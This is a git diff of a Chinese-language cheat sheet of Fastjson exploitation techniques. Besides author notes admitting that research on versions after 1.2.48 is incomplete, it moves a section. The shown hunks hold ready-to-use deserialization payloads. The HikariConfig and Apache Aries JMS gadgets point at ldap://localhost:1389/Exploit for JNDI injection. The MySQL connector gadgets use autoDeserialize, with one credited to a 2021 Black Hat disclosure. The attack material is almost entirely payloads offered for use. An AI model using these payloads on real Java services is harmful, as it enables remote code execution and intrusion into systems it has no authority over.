@@ -3,7 +3,8 @@
 Fastjson姿势技巧集合
 
 ## 说明
-持续更新，手工yyds。
+2021.8.10 小弟水平有限，1.2.48之后高版本漏洞成因还未进行研究探索，很多利用细节和注意事项都不够完整，待我有空慢慢补充。
+
 
 ## 探测
 
@@ -464,10 +465,12 @@ poc:
 ```
 
 
+**1.2.48之后版本，小弟水平有限还未复现研究，payload需要注意的细节还未探索**
+
 
 ### Fastjson1.2.5 <= 1.2.59
 
-需要开启AutoType
+**需要开启AutoType**
 
 ```java
 {"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
@@ -725,17 +728,8 @@ poc:
     'protocolVersion':1
 }
 ```
-
-
-
-### fastjson未知版本
-
-```java
-{"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
-
-{"@type":"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
-```
-腾讯玄武黑帽大会分享，具体版本待整理复现
+2021黑帽大会腾讯玄武披露   
+详细漏洞原理待研究
 ```java
 Mysqlconnector 5.1.x
 {"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"mysql.host","portToConnectTo":3306,"info":{"user":”user","password":”pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":”dbname","url":""}
@@ -746,6 +740,18 @@ Mysqlconnector 6.0.2 or 6.0.3
 Mysqlconnector 6.x or < 8.0.20
 {"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "masters": [{"host":"mysql.host"}], "slaves":[], "properties":{"host":"mysql.host","user":"user","dbname":"dbname","password":"pass","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"}}}}
 ```
+
+
+
+### fastjson未知版本
+待探索
+
+```java
+{"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
+
+{"@type":"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
+```
+
 
 
 
